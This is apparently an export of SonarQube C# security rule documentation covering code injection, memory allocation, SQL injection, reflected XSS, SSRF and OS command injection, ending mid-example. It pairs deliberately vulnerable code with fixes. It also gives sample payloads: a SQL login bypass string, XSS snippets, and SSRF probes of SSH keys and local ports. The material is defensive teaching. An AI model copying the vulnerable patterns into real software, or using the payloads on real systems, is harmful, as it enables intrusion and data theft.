<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br /> Therefore, our first suggestion is to
avoid using OS commands in the first place.<br /> However, if the application requires running OS commands with user-controlled data, here are some
security suggestions.</p>
<h4>Pre-Approved commands</h4>
<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the
cleanest way to avoid this problem is to validate the input before using it in an OS command.</p>
<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br />
If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use
regexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using
<code>^/bin/(ls|pwd|grep)$</code>.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h4>Neutralize special characters</h4>
<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special
sanitization components, such as <code>System.Diagnostics.ProcessStartInfo</code>.</p>
<p>The library helps you to get rid of common dangerous characters, such as:</p>
<ul><li> <code>&amp;</code> </li><li> <code>|</code> </li><li> <code>;</code> </li><li> <code>$</code> </li><li> <code>&gt;</code> </li><li> <code>&lt;</code> </li><li> <code>\&#96;</code> </li><li> <code>\\</code> </li><li> <code>!</code> </li></ul>
<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are
neutralized.<br /> Argument delimiters count <code>&#39;</code>, <code>-</code> and spaces.</p>
<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br /> In this case, option processing can be
terminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a href="https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits" rel="nofollow">since its version 2.24</a>.</p>
<p>Here, using the <code>ProcessStartInfo</code> structure helps escaping the passed arguments and internally creates a single string given to the
operating system when <code>System.Diagnostics.Process.Start()</code> is called.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" rel="nofollow">OWASP, OS Command Injection Defense
  Cheaty Sheet</a> </li><li> <a href="https://gtfobins.github.io/#&#43;shell" rel="nofollow">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li><li> <a href="https://lolbas-project.github.io/#" rel="nofollow">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/78" rel="nofollow">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5334">
              roslyn.sonaranalyzer.security.cs:S5334
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br /> An attacker can influence the
behavior of the targeted application and modify it to get access to sensitive data.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable
application.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code
runs with root privileges, and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of code injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to arbitrary code execution because it compiles and runs HTTP data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.CodeDom.Compiler;

public class ExampleController : Controller
{
    public void Run(string message)
    {
        const string code &#61; &#64;&#34;
            using System;
            public class MyClass
            {
                public void MyMethod()
                {
                    Console.WriteLine(&#34;&#34;&#34; &#43; message &#43; &#64;&#34;&#34;&#34;);
                }
            }
        &#34;;

        var provider &#61; CodeDomProvider.CreateProvider(&#34;CSharp&#34;);
        var compilerParameters &#61; new CompilerParameters { ReferencedAssemblies &#61; { &#34;System.dll&#34;, &#34;System.Runtime.dll&#34; } };
        var compilerResults &#61; provider.CompileAssemblyFromSource(compilerParameters, code);
        object myInstance &#61; compilerResults.CompiledAssembly.CreateInstance(&#34;MyClass&#34;);
        myInstance.GetType().GetMethod(&#34;MyMethod&#34;).Invoke(myInstance, new object[0]);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.CodeDom.Compiler;

public class ExampleController : Controller
{
    public void Run(string message)
    {
        const string code &#61; &#64;&#34;
            using System;
            public class MyClass
            {
                public void MyMethod(string input)
                {
                    Console.WriteLine(input);
                }
            }
        &#34;;

        var provider &#61; CodeDomProvider.CreateProvider(&#34;CSharp&#34;);
        var compilerParameters &#61; new CompilerParameters { ReferencedAssemblies &#61; { &#34;System.dll&#34;, &#34;System.Runtime.dll&#34; } };
        var compilerResults &#61; provider.CompileAssemblyFromSource(compilerParameters, code);
        object myInstance &#61; compilerResults.CompiledAssembly.CreateInstance(&#34;MyClass&#34;);
        myInstance.GetType().GetMethod(&#34;MyMethod&#34;).Invoke(myInstance, new object[]{ message }); // Pass message to dynamic method
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>
<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br /> Therefore, our suggestion
is to avoid executing code dynamically.<br /> If the application requires the execution of dynamic code, additional security measures must be taken.</p>
<h4>Dynamic parameters</h4>
<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the
dynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic
code and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and
perform the processing.</p>
<p>The compliant code example uses such an approach.</p>
<h4>Allow list</h4>
<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage
using an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>
<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the
parameter is accepted. Otherwise, it is rejected and an error is raised.</p>
<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where
only valid ones can be converted to a safe value.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/moodle-remote-code-execution/" rel="nofollow">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/95" rel="nofollow">MITRE, CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  (&#39;Eval Injection&#39;) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S6639">
              roslyn.sonaranalyzer.security.cs:S6639
            </a>
          </td>
          <td>
            <details>
              <p>Memory allocation injections occur when an application computes the size of a piece of memory to be allocated from an untrusted source. In such a
case, an attacker could be able to make the application unwillingly consume an important amount of memory by enforcing a large allocation size.</p>
<h2>Why is this an issue?</h2>
<p>By repeatedly requesting a feature that consumes a lot of memory, attackers can constantly occupy an important part of an application’s hosting
server memory. Depending on the application’s deployment architecture, hosting server resources and attackers&#39; capabilities, this can lead to an
exhaustion of the available server’s memory.</p>
<h3>What is the potential impact?</h3>
<p>A server that faces a memory exhaustion situation can become unstable. The exact impact will depend on how the affected application is deployed and
how well the hosting server configuration is hardened.</p>
<p>In the worst case, when the application is deployed in an uncontained environment, directly on its host system, the memory exhaustion will affect
the whole hosting server. The server’s operating system might start killing arbitrary memory-intensive processes, including the main application or
other sensitive ones. This will result in a general operating failure, also known as a Denial of Service (DoS).</p>
<p>In cases where the application is deployed in a virtualized or otherwise contained environment, or where memory usage limits are in place, the
consequences are limited to the vulnerable application only. In that case, other processes and applications hosted on the same server may keep on
running without perturbation. The mainly affected application will still stop working properly.</p>
<p>In general, that kind of DoS attack can have severe financial consequences. They are particularly important when the affected systems are
business-critical.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to a memory allocation injection because the size of a memory allocation is determined using a user-controlled
source. It then performs the actual allocation without any verification or other sanitization over the provided size.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
[Route(&#34;NonCompliantArrayList&#34;)]
public string NonCompliantArrayList()
{
    int size;
    try
    {
        size &#61; int.Parse(Request.Query[&#34;size&#34;]);
    }
    catch (FormatException)
    {
        return &#34;Number format exception while reading size&#34;;
    }
    ArrayList arrayList &#61; new ArrayList(size); // Noncompliant
    return size &#43; &#34; bytes were allocated.&#34;;
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public const int MAX_ALLOC_SIZE &#61; 1024;

[Route(&#34;CompliantArrayList&#34;)]
public string CompliantArrayList()
{
    int size;
    try
    {
        size &#61; int.Parse(Request.Query[&#34;size&#34;]);
    }
    catch (FormatException)
    {
        return &#34;Number format exception while reading size&#34;;
    }
    size &#61; Math.Min(size, MAX_ALLOC_SIZE);
    ArrayList arrayList &#61; new ArrayList(size);
    return size &#43; &#34; bytes were allocated.&#34;;
}
</pre>
<h3>How does this work?</h3>
<h4>Enforce an upper limit</h4>
<p>When performing a memory allocation whose size depends on a user-controlled parameter, it is of prime importance to enforce an upper limit to the
size being allocated. This will prevent any overly big memory slot from being consumed by a single allocation.</p>
<p>Note that forcing an upper limit will not prevent Denial of Service attacks. When an allocation size is restricted to a reasonable amount,
attackers can still request the allocating feature multiple times until the combined allocation size becomes big enough to cause exhaustion. However,
the smaller the allowed allocation size, the higher the number of necessary requests and, thus, the higher the required resources on the attacker
side. As for most of the DoS attack vectors, a trade-off must be found to prevent most attackers from causing exhaustion while keeping a good level of
performance and usability.</p>
<p>Here, the example compliant code uses the <code>Math.Min</code> function to enforce a reasonable upper bound to the allocation size. In that case,
no more than 1024 bytes can be allocated at a time.</p>
<h4>Harden the execution environment configuration</h4>
<p>As a defense in depth measure, it is advised to harden the execution environment configuration regarding memory usage. This can effectively reduce
the scope of a successful Denial of Service attack and prevent a complete outage, potentially ranging over multiple applications.</p>
<p>When running the application in a contained environment, like a Docker container, it is usually possible to limit the amount of memory provided to
the contained environment. In that case, memory exhaustion will only impact the application hosting container and not the host system.</p>
<p>When running the application directly on a physical or heavy virtualized server, memory limits can sometimes be set on the application’s associated
service account. For example, the <code>ulimit</code> mechanism of Unix based operating systems can be used for that purpose. With such a limit set
up, memory exhaustion only impacts the applications and processes owned by the related service account.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://owasp.org/www-community/attacks/Denial_of_Service" rel="nofollow">OWASP</a> - Denial of Service </li><li> <a href="https://www.linux.org/docs/man8/pam_limits.html" rel="nofollow">Linux.org</a> - pam_limits - PAM module to limit resources </li><li> <a href="https://access.redhat.com/solutions/1257953" rel="nofollow">RedHat</a> - How to set limits for services in RHEL and systemd </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/789.html" rel="nofollow">MITRE, CWE789</a> - Memory Allocation with Excessive Size Value </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S3649">
              roslyn.sonaranalyzer.security.cs:S3649
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and
inserts it into a database query without sanitizing it first.</p>
<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is
used.</p>
<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>
<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to SQL injection:<br /> After discovering the injection, attackers inject data into the
vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data manipulation</h4>
<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread
impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br /> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Chaining DB injections with other vulnerabilities</h4>
<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br /> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul><li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li><li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).
    <ul><li> See <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/" rel="nofollow">our article on this topic</a> </li></ul>  </li></ul>
<h2>How to fix it in Entity Framework Core</h2>
<h3>Code examples</h3>
<p>The following code is an example of an overly simple authentication function. It is vulnerable to SQL injection because user-controlled data is
inserted directly into a query string: The application assumes that incoming data always has a specific range of characters, and ignores that some
characters may change the query logic to a malicious one.</p>
<p>In this particular case, the query can be exploited with the following string:</p>
<pre>
foo&#39; OR 1&#61;1 --
</pre>
<p>By adapting and inserting this template string into one of the fields (<code>user</code> or <code>pass</code>), an attacker would be able to log in
as any user within the scoped user table.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    private readonly UserAccountContext Context;

    public IActionResult Authenticate(string user, string pass)
    {
        var query &#61; &#34;SELECT * FROM users WHERE user &#61; &#39;&#34; &#43; user &#43; &#34;&#39; AND pass &#61; &#39;&#34; &#43; pass &#43; &#34;&#39;&#34;;

        var queryResults &#61; Context
            .Database
            .FromSqlRaw(query);

        if (queryResults &#61;&#61; 0)
        {
            return Unauthorized();
        }

        return Ok();
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
public class ExampleController : Controller
{
    private readonly UserAccountContext Context;

    public IActionResult Authenticate(string user, string pass)
    {
        var query &#61; &#34;SELECT * FROM users WHERE user &#61; {0} AND pass &#61; {1}&#34;;

        var queryResults &#61; Context
            .Database
            .FromSqlRaw(query, user, pass);

        if (queryResults &#61;&#61; 0)
        {
            return Unauthorized();
        }

        return Ok();
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use prepared statements</h4>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an
interpreted context.</p>
<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br /> Here is an example with the
following query string (Java SE syntax):</p>
<pre>
SELECT * FROM users WHERE user &#61; ? AND pass &#61; ?
</pre>
<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol &#39;?&#39; was used as
a placeholder.</strong></p>
<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals
corresponding to the placeholders to the database.<br /> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and
some do not - because they do it transparently.</p>
<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>
<p>After compilation, the query logic is frozen and cannot be changed.<br /> So when the application passes the literals that replace the placeholders,
they are not considered application logic by the database.</p>
<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes
them.</p>
<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a
query. An attacker who controls this third-party data can cause the database to execute malicious code.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/" rel="nofollow">SonarSource, Exploiting Hibernate Injections</a> </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP, SQL Injection Prevention Cheat
  Sheet</a> </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS, Top 25 Software Errors</a> - Insecure Interaction Between Components </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/89" rel="nofollow">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command
  </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITdGBQ" rel="nofollow">CERT, IDS00-J.</a> - Prevent SQL injection </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5131">
              roslyn.sonaranalyzer.security.cs:S5131
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of
the victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back
to the user.</p>
<h2>Why is this an issue?</h2>
<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming
HTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>
<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own
browser.</p>
<p>A user with malicious intent carefully crafts the link beforehand.</p>
<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code
that can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Vandalism on the front-end website</h4>
<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and
theft of the benevolent user’s data.</p>
<h4>Identity spoofing</h4>
<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>
<h4>Record user activity</h4>
<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard
activity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br /> For
example, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code
injection vulnerability in the admin control panel of a web application.</p>
<h2>How to fix it in ASP.NET</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Web;
using System.Web.Mvc;

public class HelloController : Controller
{
    [HttpGet]
    public void Hello(string name, HttpResponse response)
    {
        string html &#61; &#34;&lt;h1&gt;Hello&#34;&#43; name &#43;&#34;&lt;/h1&gt;&#34;
        response.Write(html);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Web;
using System.Web.Mvc;

public class HelloController : Controller
{
    [HttpGet]
    public void Hello(string name, HttpResponse response)
    {
        string html &#61; &#34;&lt;h1&gt;Hello&#34;&#43; HttpUtility.HtmlEncode(name) &#43;&#34;&lt;/h1&gt;&#34;
        response.Write(html);
    }
}
</pre>
<h3>How does this work?</h3>
<p>If the HTTP response is HTML code, it is highly recommended to use <a href="https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c" rel="nofollow">Razor-based view templates</a> to
generate it. This template engine separates the view from the business logic and automatically encodes the output of variables, drastically reducing
the risk of cross-site scripting vulnerabilities.</p>
<h4>Encode data according to the HTML context</h4>
<p>The best approach to protect against XSS is to systematically encode data that is written to HTML documents. The goal is to leave the data intact
from the end user’s point of view but make it uninterpretable by web browsers.</p>
<p>XSS exploitation techniques vary depending on the HTML context where malicious input is injected. For each HTML context, there is a specific
encoding to prevent JavaScript code from being interpreted. The following table summarizes the encoding to apply for each HTML context.</p>
ContextCode exampleExploit exampleEncoding <p>Inbetween tags</p> <pre>
&lt;!doctype html&gt;
&lt;div&gt;
  { data }
&lt;/div&gt;
</pre><pre>
&lt;!doctype html&gt;
&lt;div&gt;
  &lt;script&gt;
    alert(1)
  &lt;/script&gt;
&lt;/div&gt;
</pre> <p>HTML entity encoding: replace the following characters by HTML-safe sequences.</p>
        <ul><li> &amp; → &amp;amp; </li><li> &lt; → &amp;lt; </li><li> &gt; → &amp;gt; </li><li> &#34; → &amp;quot; </li><li> &#39; → &amp;#x27; </li></ul>  <p>In an attribute surrounded with single or double quotes</p> <pre>
&lt;!doctype html&gt;
&lt;div tag&#61;&#34;{ data }&#34;&gt;
  ...
&lt;/div&gt;
</pre><pre>
&lt;!doctype html&gt;
&lt;div tag&#61;&#34;&#34;
     onmouseover&#61;&#34;alert(1)&#34;&gt;
  ...
&lt;/div&gt;
</pre> <p>HTML entity encoding: replace the following characters with HTML-safe sequences.</p>
        <ul><li> &amp; → &amp;amp; </li><li> &lt; → &amp;lt; </li><li> &gt; → &amp;gt; </li><li> &#34; → &amp;quot; </li><li> &#39; → &amp;#x27; </li></ul>  <p>In an unquoted attribute</p> <pre>
&lt;!doctype html&gt;
&lt;div tag&#61;{ data }&gt;
  ...
&lt;/div&gt;
</pre><pre>
&lt;!doctype html&gt;
&lt;div tag&#61;foo
     onmouseover&#61;alert(1)&gt;
  ...
&lt;/div&gt;
</pre> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully.</p>  <p>In a URL attribute</p> <pre>
&lt;!doctype html&gt;
&lt;a href&#61;&#34;{ data }&#34;&gt;
  ...
&lt;/a&gt;
</pre><pre>
&lt;!doctype html&gt;
&lt;a href&#61;&#34;javascript:alert(1)&#34;&gt;
  ...
&lt;/a&gt;
</pre> <p>Validate the URL by parsing the data. Make sure relative URLs start with a <code>/</code> and that absolute URLs use <code>https</code>
      as a scheme.</p>  <p>In a script block</p> <pre>
&lt;!doctype html&gt;
&lt;script&gt;
  { data }
&lt;/script&gt;
</pre><pre>
&lt;!doctype html&gt;
&lt;script&gt;
  alert(1)
&lt;/script&gt;
</pre> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully. To pass values to a JavaScript context, the recommended way is to use a data attribute:</p>  <pre>
&lt;!doctype html&gt;
&lt;script data&#61;&#34;{ data }&#34;&gt;
  ...
&lt;/script&gt;
</pre>
<p><code>System.Web.HttpUtility.HtmlEncode</code> is the recommended method to encode HTML entities.</p>
<h3>Pitfalls</h3>
<h4>The limits of validation</h4>
<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the
recommended approach.</p>
<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is
sometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the
filters.</p>
<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is
trying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,
in the long run, is very difficult.</p>
<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of &#34;javascript:&#34; URI.</p>
<h3>Going the extra mile</h3>
<h4>Content Security Policy (CSP) Header</h4>
<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to
<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt
to exploit XSS in the application.<br /> <a href="https://web.dev/csp-xss/" rel="nofollow">Learn more here.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li></ul>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/wordpress-stored-xss-vulnerability" rel="nofollow">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li><li> <a href="https://blog.sonarsource.com/ghost-admin-takeover" rel="nofollow">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li><li> <a href="https://samy.pl/myspace/" rel="nofollow">Samy Kamkar, The MySpace Worm</a> </li></ul>
<h3>Conference presentations</h3>
<ul><li> <a href="https://www.youtube.com/watch?v&#61;ksq7e6UUDag" rel="nofollow">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>
  </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79.html" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5144">
              roslyn.sonaranalyzer.security.cs:S5144
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br /></p>
<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br /> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be
treated in the same way as basic SSRF.</p>
<h3>What is the potential impact?</h3>
<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to
what is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>
<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can
range from low to critical severity.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Local file read to host takeover</h4>
<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File
URI scheme <code>file://</code>.<br /> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web
application.</p>
<h4>Internal Network Reconnaissance</h4>
<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port
field in the URL <code>http://127.0.0.1:{port}</code>.<br /> Taking advantage of other supported URL schemas (dependent on the affected system), for
example, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>
<h2>How to fix it in ASP.NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to SSRF as it performs an HTTP request to a URL defined by untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Web;
using System.Web.Mvc;

public class ExampleController: Controller
{
    [HttpGet]
    public IActionResult ImageFetch(string location)
    {
        HttpWebRequest request &#61; (HttpWebRequest)WebRequest.Create(location);

        return Ok();
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Web;
